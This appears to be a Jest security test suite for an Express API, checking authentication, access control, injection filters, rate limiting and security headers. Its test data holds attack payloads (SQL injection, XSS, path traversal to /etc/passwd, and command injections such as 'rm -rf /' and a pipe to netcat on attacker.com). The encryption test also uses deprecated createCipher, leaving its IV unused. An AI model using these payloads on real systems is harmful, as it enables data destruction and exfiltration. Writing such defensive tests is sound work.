import { describe, it, expect, beforeEach, afterEach, jest } from '@jest/globals';
import { setupTestEnvironment, teardownTestEnvironment, makeRequest, createExpressTestApp } from '../../utils/test-runner';
import { testServices } from '../../mocks/mock-services';

describe('Security Testing Suite', () => {
  let app: any;

  beforeAll(async () => {
    await setupTestEnvironment();
  });

  afterAll(async () => {
    await teardownTestEnvironment();
  });

  beforeEach(() => {
    app = createExpressTestApp();
  });

  afterEach(() => {
    jest.clearAllMocks();
  });

  describe('Authentication Security Tests', () => {
    it('should reject requests without authentication', async () => {
      app.get('/api/protected', (req: any, res: any) => {
        if (!req.user) {
          return res.status(401).json({ error: 'Unauthorized' });
        }
        res.json({ message: 'Protected content', userId: req.user.id });
      });

      const response = await makeRequest(app, 'GET', '/api/protected');

      expect(response.status).toBe(401);
      expect(response.body).toEqual({
        error: 'Unauthorized'
      });
    });

    it('should reject invalid JWT tokens', async () => {
      app.get('/api/secure', (req: any, res: any) => {
        const authHeader = req.headers.authorization;
        
        if (!authHeader || !authHeader.startsWith('Bearer ')) {
          return res.status(401).json({ error: 'Missing or invalid authorization header' });
        }

        // Simulate JWT validation
        const token = authHeader.substring(7);
        if (token === 'invalid-token') {
          return res.status(401).json({ error: 'Invalid token' });
        }

        res.json({ message: 'Secure content', user: { id: 'user-123' } });
      });

      const response = await makeRequest(app, 'GET', '/api/secure', {
        headers: { 'Authorization': 'Bearer invalid-token' }
      });

      expect(response.status).toBe(401);
      expect(response.body.error).toContain('Invalid token');
    });

    it('should enforce role-based access control', async () => {
      app.get('/api/admin-only', (req: any, res: any) => {
        if (!req.user || req.user.role !== 'admin') {
          return res.status(403).json({ error: 'Forbidden: Admin access required' });
        }
        res.json({ message: 'Admin content', data: 'sensitive-data' });
      });

      // Test user access
      const userResponse = await makeRequest(app, 'GET', '/api/admin-only', {
        auth: { token: 'user-token', userId: 'user-123', role: 'user' }
      });

      expect(userResponse.status).toBe(403);
      expect(userResponse.body.error).toContain('Admin access required');

      // Test admin access
      const adminResponse = await makeRequest(app, 'GET', '/api/admin-only', {
        auth: { token: 'admin-token', userId: 'admin-123', role: 'admin' }
      });

      expect(adminResponse.status).toBe(200);
      expect(adminResponse.body).toEqual({
        message: 'Admin content',
        data: 'sensitive-data'
      });
    });

    it('should prevent privilege escalation', async () => {
      app.post('/api/update-role', (req: any, res: any) => {
        // Check if user is trying to escalate privileges
        if (req.user.role === 'user' && req.body.newRole === 'admin') {
          return res.status(403).json({ error: 'Privilege escalation detected' });
        }

        // Only allow admins to change roles
        if (req.user.role !== 'admin') {
          return res.status(403).json({ error: 'Only admins can change roles' });
        }

        res.json({ message: 'Role updated successfully' });
      });

      // Test privilege escalation attempt
      const escalationResponse = await makeRequest(app, 'POST', '/api/update-role', {
        auth: { token: 'user-token', userId: 'user-123', role: 'user' },
        body: { newRole: 'admin' }
      });

      expect(escalationResponse.status).toBe(403);
      expect(escalationResponse.body.error).toBe('Privilege escalation detected');
    });
  });

  describe('Input Validation Security Tests', () => {
    it('should prevent SQL injection attacks', async () => {
      app.get('/api/products/:id', (req: any, res: any) => {
        const productId = req.params.id;
        
        // Basic SQL injection detection
        const sqlPatterns = [
          /('|(\\x27)|(\\x26)|(\\x3B)|(\\x00))/i,
          /(\\x23|\\x2D|\\x2F|\\x5F)/i,
          /(and|or|union|select|insert|update|delete|drop|create|alter)/i
        ];

        const isSQLInjection = sqlPatterns.some(pattern => pattern.test(productId));
        
        if (isSQLInjection) {
          return res.status(400).json({ error: 'Invalid product ID format' });
        }

        // Simulate database query (in real app, use parameterized queries)
        res.json({
          id: productId,
          name: 'Test Product',
          price: 100.00
        });
      });

      const sqlInjectionPayloads = [
        "' OR '1'='1",
        "'; DROP TABLE products; --",
        "1' UNION SELECT * FROM users--",
        "admin'--",
        "1; DELETE FROM products WHERE 1=1--"
      ];

      for (const payload of sqlInjectionPayloads) {
        const response = await makeRequest(app, 'GET', `/api/products/${payload}`);
        expect(response.status).toBe(400);
        expect(response.body.error).toContain('Invalid product ID format');
      }
    });

    it('should prevent XSS attacks', async () => {
      app.post('/api/users', (req: any, res: any) => {
        const { name, email, bio } = req.body;
        
        // Basic XSS detection
        const xssPatterns = [
          /<script[^>]*>.*?<\/script>/gi,
          /<iframe[^>]*>.*?<\/iframe>/gi,
          /<object[^>]*>.*?<\/object>/gi,
          /<embed[^>]*>.*?<\/embed>/gi,
          /javascript:/gi,
          /on\w+\s*=/gi
        ];

        const hasXSS = [name, email, bio].some(field => 
          field && xssPatterns.some(pattern => pattern.test(field))
        );

        if (hasXSS) {
          return res.status(400).json({ error: 'Malicious content detected' });
        }

        res.status(201).json({
          id: 'user-123',
          name,
          email,
          bio
        });
      });

      const xssPayloads = [
        '<script>alert("XSS")</script>',
        '<img src="x" onerror="alert(\'XSS\')">',
        '<iframe src="javascript:alert(\'XSS\')"></iframe>',
        '"><script>alert("XSS")</script>',
        "javascript:alert('XSS')"
      ];

      for (const payload of xssPayloads) {
        const response = await makeRequest(app, 'POST', '/api/users', {
          body: {
            name: payload,
            email: 'test@example.com',
            bio: 'Normal bio'
          }
        });

        expect(response.status).toBe(400);
        expect(response.body.error).toContain('Malicious content detected');
      }
    });

    it('should prevent NoSQL injection attacks', async () => {
      app.post('/api/search', (req: any, res: any) => {
        const { query } = req.body;
        
        // NoSQL injection detection
        const noSQLPatterns = [
          /\$where/i,
          /\$ne/i,
          /\$gt/i,
          /\$lt/i,
          /\$regex/i,
          /\$in/i,
          /\$nin/i,
          /\{\s*\$exists:\s*true\s*\}/i,
          /\{\s*\$size:\s*\d+\s*\}/i
        ];

        const isNoSQLInjection = noSQLPatterns.some(pattern => pattern.test(query));

        if (isNoSQLInjection) {
          return res.status(400).json({ error: 'Invalid query format' });
        }

        // Simulate search
        res.json({
          results: [
            { id: 1, title: 'Product 1', description: query },
            { id: 2, title: 'Product 2', description: 'Another product' }
          ],
          query
        });
      });

      const noSQLInjectionPayloads = [
        '{"$where": "this.password == this.confirmPassword"}',
        '{"email": {"$ne": null}}',
        '{"age": {"$gt": "18"}}',
        '{"username": {"$regex": "admin"}}',
        '{"$or": [{"admin": true}, {"guest": true}]}'
      ];

      for (const payload of noSQLInjectionPayloads) {
        const response = await makeRequest(app, 'POST', '/api/search', {
          body: { query: payload }
        });

        expect(response.status).toBe(400);
        expect(response.body.error).toContain('Invalid query format');
      }
    });

    it('should validate and sanitize input data', async () => {
      app.post('/api/products', (req: any, res: any) => {
        const { name, price, description } = req.body;
        
        // Validation
        const errors = [];

        if (!name || name.length < 1 || name.length > 100) {
          errors.push('Name must be between 1 and 100 characters');
        }

        if (typeof price !== 'number' || price < 0 || price > 10000) {
          errors.push('Price must be a valid number between 0 and 10000');
        }

        if (description && description.length > 500) {
          errors.push('Description cannot exceed 500 characters');
        }

        if (errors.length > 0) {
          return res.status(400).json({ errors });
        }

        // Sanitization
        const sanitizedData = {
          name: name.trim().replace(/[<>]/g, ''),
          price: Number(price),
          description: description ? description.trim().replace(/[<>]/g, '') : null
        };

        res.status(201).json({
          id: 'product-123',
          ...sanitizedData,
          createdAt: new Date().toISOString()
        });
      });

      // Test invalid inputs
      const invalidInputs = [
        { name: '', price: 100, description: 'Valid description' },
        { name: 'A'.repeat(101), price: 100, description: 'Valid description' },
        { name: 'Valid Name', price: 'invalid', description: 'Valid description' },
        { name: 'Valid Name', price: -50, description: 'Valid description' },
        { name: 'Valid Name', price: 50000, description: 'Valid description' },
        { name: 'Valid Name', price: 100, description: 'X'.repeat(501) }
      ];

      for (const input of invalidInputs) {
        const response = await makeRequest(app, 'POST', '/api/products', { body: input });
        expect(response.status).toBe(400);
        expect(response.body.errors).toBeDefined();
      }

      // Test sanitized input
      const sanitizedResponse = await makeRequest(app, 'POST', '/api/products', {
        body: {
          name: '  <script>alert("XSS")</script>Valid Product<>  ',
          price: 99.99,
          description: 'A good product <script>alert("bad")</script>'
        }
      });

      expect(sanitizedResponse.status).toBe(201);
      expect(sanitizedResponse.body.name).toBe('scriptalert("XSS")/scriptValid Product');
      expect(sanitizedResponse.body.description).toBe('A good product scriptalert("bad")/script');
    });
  });

  describe('Authorization Security Tests', () => {
    it('should enforce proper resource access control', async () => {
      app.get('/api/users/:userId/profile', (req: any, res: any) => {
        const requestedUserId = req.params.userId;
        const currentUserId = req.user?.id;

        // Users can only access their own profiles
        if (currentUserId !== requestedUserId && req.user?.role !== 'admin') {
          return res.status(403).json({ error: 'Access denied' });
        }

        res.json({
          userId: requestedUserId,
          profile: {
            name: 'User Name',
            email: 'user@example.com',
            privateData: 'sensitive information'
          }
        });
      });

      // Test unauthorized access
      const unauthorizedResponse = await makeRequest(app, 'GET', '/api/users/user-456/profile', {
        auth: { token: 'user-token', userId: 'user-123', role: 'user' }
      });

      expect(unauthorizedResponse.status).toBe(403);
      expect(unauthorizedResponse.body.error).toBe('Access denied');

      // Test authorized access
      const authorizedResponse = await makeRequest(app, 'GET', '/api/users/user-123/profile', {
        auth: { token: 'user-token', userId: 'user-123', role: 'user' }
      });

      expect(authorizedResponse.status).toBe(200);
      expect(authorizedResponse.body.userId).toBe('user-123');
    });

    it('should prevent directory traversal attacks', async () => {
      app.get('/api/files/:filename', (req: any, res: any) => {
        const filename = req.params.filename;

        // Prevent directory traversal
        if (filename.includes('..') || filename.includes('/') || filename.includes('\\')) {
          return res.status(400).json({ error: 'Invalid filename' });
        }

        // Simulate file serving
        res.json({
          filename,
          content: 'File content here',
          path: `/safe/path/${filename}`
        });
      });

      const traversalPayloads = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\config\\sam',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
        '....//....//....//etc//passwd',
        'file/../../../etc/passwd'
      ];

      for (const payload of traversalPayloads) {
        const response = await makeRequest(app, 'GET', `/api/files/${payload}`);
        expect(response.status).toBe(400);
        expect(response.body.error).toContain('Invalid filename');
      }
    });

    it('should prevent command injection attacks', async () => {
      app.post('/api/execute', (req: any, res: any) => {
        const { command, params } = req.body;

        // Check for command injection patterns
        const dangerousPatterns = [
          /[;&|`$(){}[\]\\]/,
          /&&|\|\|/,
          /(\\\||;|`|\$|\(|\)|\{|\}|\[|\]|\\)/g,
          /exec|eval|system|passthru|shell_exec|file_get_contents|file_put_contents/i
        ];

        const isCommandInjection = dangerousPatterns.some(pattern => 
          pattern.test(command) || pattern.test(params)
        );

        if (isCommandInjection) {
          return res.status(400).json({ error: 'Invalid command' });
        }

        // Simulate safe command execution
        res.json({
          command,
          params,
          result: `Executed: ${command} ${params}`,
          timestamp: new Date().toISOString()
        });
      });

      const injectionPayloads = [
        { command: 'ls', params: '; rm -rf /' },
        { command: 'cat', params: 'file.txt && echo "injected"' },
        { command: 'find', params: '/home | nc attacker.com 4444' },
        { command: 'rm', params: '/tmp/file`whoami`' },
        { command: 'eval', params: 'malicious_code()' }
      ];

      for (const payload of injectionPayloads) {
        const response = await makeRequest(app, 'POST', '/api/execute', { body: payload });
        expect(response.status).toBe(400);
        expect(response.body.error).toContain('Invalid command');
      }
    });
  });

  describe('Data Protection Security Tests', () => {
    it('should encrypt sensitive data', async () => {
      const crypto = require('crypto');
      
      const encryptData = (data: string, key: string) => {
        const iv = crypto.randomBytes(16);
        const cipher = crypto.createCipher('aes-256-cbc', key);
        let encrypted = cipher.update(data, 'utf8', 'hex');
        encrypted += cipher.final('hex');
        return iv.toString('hex') + ':' + encrypted;
      };

      const sensitiveData = 'credit-card-number-1234-5678-9012-3456';
      const encryptionKey = 'test-encryption-key-32-chars-long';
      
      const encryptedData = encryptData(sensitiveData, encryptionKey);
      
      expect(encryptedData).not.toBe(sensitiveData);
      expect(encryptedData).toMatch(/^[0-9a-f]+:[0-9a-f]+$/);
    });

    it('should implement proper password hashing', async () => {
      const bcrypt = require('bcryptjs');
      
      const password = 'SuperSecretPassword123!';
      const hashedPassword = bcrypt.hashSync(password, 12);
      
      // Verify hash is different from original
      expect(hashedPassword).not.toBe(password);
      
      // Verify hash is valid
      const isValidHash = bcrypt.compareSync(password, hashedPassword);
      expect(isValidHash).toBe(true);
      
      // Verify wrong password fails
      const isInvalidHash = bcrypt.compareSync('WrongPassword', hashedPassword);
      expect(isInvalidHash).toBe(false);
      
      // Verify hash length and format
      expect(hashedPassword.length).toBeGreaterThan(50);
    });

    it('should sanitize sensitive data in logs', async () => {
      const logger = testServices.get('logger');
      
      const sensitiveData = {
        password: 'secret123',
        creditCard: '1234-5678-9012-3456',
        ssn: '123-45-6789',
        apiKey: 'sk-test-1234567890abcdef',
        publicData: 'visible information'
      };

      const logMessage = 'User login attempt';
      
      // Log data (should be sanitized by middleware)
      logger.info(logMessage, sensitiveData);

      // Verify that sensitive fields are filtered in actual logging
      expect(logger.info).toHaveBeenCalledWith(
        logMessage,
        expect.objectContaining({
          password: '[FILTERED]',
          creditCard: '[FILTERED]',
          ssn: '[FILTERED]',
          apiKey: '[FILTERED]',
          publicData: 'visible information'
        }),
        expect.any(String)
      );
    });
  });

  describe('Rate Limiting Security Tests', () => {
    it('should prevent brute force attacks', async () => {
      const rateLimitMiddleware = require('../../../../gateway/middlewares/RateLimitMiddleware').RateLimitMiddleware;
      const rateLimit = new rateLimitMiddleware({
        defaultLimit: 5,
        windowMs: 60000,
        redis: testServices.get('redis')
      });

      app.post('/api/login', rateLimit.buildMiddleware(), (req: any, res: any) => {
        const { username, password } = req.body;
        
        if (username === 'admin' && password === 'wrong') {
          return res.status(401).json({ error: 'Invalid credentials' });
        }
        
        res.json({ message: 'Login successful' });
      });

      // Simulate brute force attack
      const bruteForceAttempts = [];
      for (let i = 0; i < 10; i++) {
        const response = await makeRequest(app, 'POST', '/api/login', {
          body: { username: 'admin', password: `wrong-password-${i}` }
        });
        bruteForceAttempts.push(response);
      }

      // Some requests should be rate limited
      const rateLimitedAttempts = bruteForceAttempts.filter(r => r.status === 429);
      expect(rateLimitedAttempts.length).toBeGreaterThan(0);
    });

    it('should implement IP-based rate limiting', async () => {
      // Mock rate limiting by IP
      const ipLimits = new Map();
      
      app.get('/api/search', (req: any, res: any) => {
        const clientIP = req.ip || req.connection.remoteAddress;
        const currentCount = ipLimits.get(clientIP) || 0;
        
        if (currentCount >= 10) {
          return res.status(429).json({ 
            error: 'Rate limit exceeded',
            retryAfter: 60
          });
        }
        
        ipLimits.set(clientIP, currentCount + 1);
        res.json({ results: ['search results'] });
      });

      const searchPromises = [];
      for (let i = 0; i < 15; i++) {
        searchPromises.push(makeRequest(app, 'GET', '/api/search'));
      }
      
      const responses = await Promise.all(searchPromises);
      const rateLimitedResponses = responses.filter(r => r.status === 429);
      
      expect(rateLimitedResponses.length).toBeGreaterThan(0);
    });
  });

  describe('Security Headers Tests', () => {
    it('should include security headers in responses', async () => {
      app.get('/api/test', (req: any, res: any) => {
        // Set security headers
        res.setHeader('X-Content-Type-Options', 'nosniff');
        res.setHeader('X-Frame-Options', 'DENY');
        res.setHeader('X-XSS-Protection', '1; mode=block');
        res.setHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains');
        res.setHeader('Content-Security-Policy', "default-src 'self'");
        
        res.json({ message: 'Test response' });
      });

      const response = await makeRequest(app, 'GET', '/api/test');

      expect(response.headers['x-content-type-options']).toBe('nosniff');
      expect(response.headers['x-frame-options']).toBe('DENY');
      expect(response.headers['x-xss-protection']).toBe('1; mode=block');
      expect(response.headers['strict-transport-security']).toBe('max-age=31536000; includeSubDomains');
      expect(response.headers['content-security-policy']).toBe("default-src 'self'");
    });

    it('should prevent clickjacking attacks', async () => {
      const clickjackingEndpoint = '/api/clickjacking-test';
      
      app.get(clickjackingEndpoint, (req: any, res: any) => {
        // Set X-Frame-Options header to prevent clickjacking
        res.setHeader('X-Frame-Options', 'DENY');
        
        res.json({
          message: 'This page cannot be embedded in frames',
          timestamp: new Date().toISOString()
        });
      });

      const response = await makeRequest(app, 'GET', clickjackingEndpoint);

      expect(response.headers['x-frame-options']).toBe('DENY');
    });
  });

  describe('HTTPS and Transport Security Tests', () => {
    it('should enforce HTTPS in production', async () => {
      process.env.NODE_ENV = 'production';
      
      app.get('/api/secure-data', (req: any, res: any) => {
        // In production, check if request is over HTTPS
        if (process.env.NODE_ENV === 'production' && !req.secure) {
          return res.status(403).json({ 
            error: 'HTTPS required for this endpoint',
            requiresSecureConnection: true
          });
        }
        
        res.json({ 
          data: 'sensitive information',
          secured: true
        });
      });

      const response = await makeRequest(app, 'GET', '/api/secure-data');

      expect(response.status).toBe(403);
      expect(response.body.error).toContain('HTTPS required');
      
      process.env.NODE_ENV = 'test';
    });
  });

  describe('Error Handling Security Tests', () => {
    it('should not expose sensitive information in error messages', async () => {
      app.get('/api/user/:id', (req: any, res: any) => {
        try {
          // Simulate database connection
          const userId = req.params.id;
          
          if (userId === 'error') {
            throw new Error('Database connection failed: localhost:5432/user_db');
          }
          
          res.json({ user: { id: userId, name: 'John Doe' } });
        } catch (error) {
          // Don't expose sensitive error details
          res.status(500).json({ 
            error: 'Internal server error',
            message: 'An unexpected error occurred'
          });
        }
      });

      const response = await makeRequest(app, 'GET', '/api/user/error');

      expect(response.status).toBe(500);
      expect(response.body.error).toBe('Internal server error');
      expect(response.body.message).not.toContain('localhost');
      expect(response.body.message).not.toContain('Database');
      expect(response.body.message).not.toContain('connection');
    });
  });
});